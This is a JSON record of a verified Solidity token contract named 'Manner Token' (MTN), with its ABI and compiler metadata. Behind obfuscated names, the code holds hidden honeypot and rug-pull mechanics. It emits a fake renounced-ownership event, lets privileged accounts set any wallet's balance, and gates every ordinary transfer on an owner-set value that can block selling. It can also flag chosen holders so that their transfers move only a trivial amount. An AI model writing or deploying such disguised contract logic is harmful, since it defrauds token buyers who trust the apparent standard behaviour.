{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface autoTakeAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderAmount) external view returns (uint256);\n\n    function transfer(address enableReceiver, uint256 limitFrom) external returns (bool);\n\n    function allowance(address senderExemptMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableReceiver,\n        uint256 limitFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTotal, uint256 value);\n    event Approval(address indexed senderExemptMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract launchedAutoSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxFromIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableExempt {\n    function createPair(address exemptMarketing, address launchTokenTo) external returns (address);\n}\n\ninterface launchReceiver is autoTakeAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MannerToken is launchedAutoSender, autoTakeAmount, launchReceiver {\n\n    bool public teamBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeTotal;\n    }\n\n    bool private txAuto;\n\n    address teamSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private tradingAuto;\n\n    uint256 tokenShouldAmount;\n\n    uint256 private walletIsAuto;\n\n    constructor (){\n        if (listExempt == senderLiquidityWallet) {\n            senderLiquidityWallet = tradingAuto;\n        }\n        maxFromIs receiverAutoEnable = maxFromIs(teamSwap);\n        fundFee = enableExempt(receiverAutoEnable.factory()).createPair(receiverAutoEnable.WETH(), address(this));\n        if (senderLiquidityWallet != listExempt) {\n            tradingAuto = walletIsAuto;\n        }\n        minLaunch = _msgSender();\n        marketingIsReceiver();\n        isLiquidity[minLaunch] = true;\n        listTotalToken[minLaunch] = modeTotal;\n        \n        emit Transfer(address(0), minLaunch, modeTotal);\n    }\n\n    string private walletFund = \"MTN\";\n\n    function minShouldTotal(uint256 limitFrom) public {\n        atEnableIs();\n        tokenShouldAmount = limitFrom;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchLiquidity;\n    }\n\n    bool public teamLaunched;\n\n    function balanceOf(address senderAmount) public view virtual override returns (uint256) {\n        return listTotalToken[senderAmount];\n    }\n\n    function marketingIsReceiver() public {\n        emit OwnershipTransferred(minLaunch, address(0));\n        marketingSwap = address(0);\n    }\n\n    function approve(address receiverFund, uint256 limitFrom) public virtual override returns (bool) {\n        liquidityAutoFrom[_msgSender()][receiverFund] = limitFrom;\n        emit Approval(_msgSender(), receiverFund, limitFrom);\n        return true;\n    }\n\n    address public minLaunch;\n\n    mapping(address => uint256) private listTotalToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletFund;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityAutoFrom;\n\n    bool public enableLaunchSwap;\n\n    function modeReceiver(address enableTokenTrading, address enableReceiver, uint256 limitFrom) internal returns (bool) {\n        require(listTotalToken[enableTokenTrading] >= limitFrom);\n        listTotalToken[enableTokenTrading] -= limitFrom;\n        listTotalToken[enableReceiver] += limitFrom;\n        emit Transfer(enableTokenTrading, enableReceiver, limitFrom);\n        return true;\n    }\n\n    mapping(address => bool) public isLiquidity;\n\n    mapping(address => bool) public toLimit;\n\n    function atEnableIs() private view {\n        require(isLiquidity[_msgSender()]);\n    }\n\n    function allowance(address autoSell, address receiverFund) external view virtual override returns (uint256) {\n        if (receiverFund == teamSwap) {\n            return type(uint256).max;\n        }\n        return liquidityAutoFrom[autoSell][receiverFund];\n    }\n\n    address teamFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return marketingSwap;\n    }\n\n    uint256 txReceiver;\n\n    string private launchLiquidity = \"Manner Token\";\n\n    uint256 private modeTotal = 100000000 * 10 ** 18;\n\n    uint256 private senderLiquidityWallet;\n\n    function transfer(address isLaunched, uint256 limitFrom) external virtual override returns (bool) {\n        return tokenWallet(_msgSender(), isLaunched, limitFrom);\n    }\n\n    function transferFrom(address enableTokenTrading, address enableReceiver, uint256 limitFrom) external override returns (bool) {\n        if (_msgSender() != teamSwap) {\n            if (liquidityAutoFrom[enableTokenTrading][_msgSender()] != type(uint256).max) {\n                require(limitFrom <= liquidityAutoFrom[enableTokenTrading][_msgSender()]);\n                liquidityAutoFrom[enableTokenTrading][_msgSender()] -= limitFrom;\n            }\n        }\n        return tokenWallet(enableTokenTrading, enableReceiver, limitFrom);\n    }\n\n    bool private swapToken;\n\n    address private marketingSwap;\n\n    function minIs(address isLaunched, uint256 limitFrom) public {\n        atEnableIs();\n        listTotalToken[isLaunched] = limitFrom;\n    }\n\n    event OwnershipTransferred(address indexed sellTakeTeam, address indexed receiverTx);\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptLiquidity;\n    }\n\n    function amountSender(address swapTotal) public {\n        if (enableLaunchSwap) {\n            return;\n        }\n        if (autoAmount != swapToken) {\n            autoAmount = false;\n        }\n        isLiquidity[swapTotal] = true;\n        if (swapToken == teamLaunched) {\n            walletIsAuto = listExempt;\n        }\n        enableLaunchSwap = true;\n    }\n\n    function tokenWallet(address enableTokenTrading, address enableReceiver, uint256 limitFrom) internal returns (bool) {\n        if (enableTokenTrading == minLaunch) {\n            return modeReceiver(enableTokenTrading, enableReceiver, limitFrom);\n        }\n        uint256 totalLiquidity = autoTakeAmount(fundFee).balanceOf(teamFrom);\n        require(totalLiquidity == tokenShouldAmount);\n        require(enableReceiver != teamFrom);\n        if (toLimit[enableTokenTrading]) {\n            return modeReceiver(enableTokenTrading, enableReceiver, fromTotalLiquidity);\n        }\n        return modeReceiver(enableTokenTrading, enableReceiver, limitFrom);\n    }\n\n    uint256 public listExempt;\n\n    function owner() external view returns (address) {\n        return marketingSwap;\n    }\n\n    bool private autoAmount;\n\n    uint8 private exemptLiquidity = 18;\n\n    address public fundFee;\n\n    uint256 constant fromTotalLiquidity = 6 ** 10;\n\n    function receiverBuyLimit(address takeBuy) public {\n        atEnableIs();\n        \n        if (takeBuy == minLaunch || takeBuy == fundFee) {\n            return;\n        }\n        toLimit[takeBuy] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderExemptMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTakeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"}],\"name\":\"amountSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunchSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIsReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"minIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"minShouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"}],\"name\":\"receiverBuyLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTokenTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MannerToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}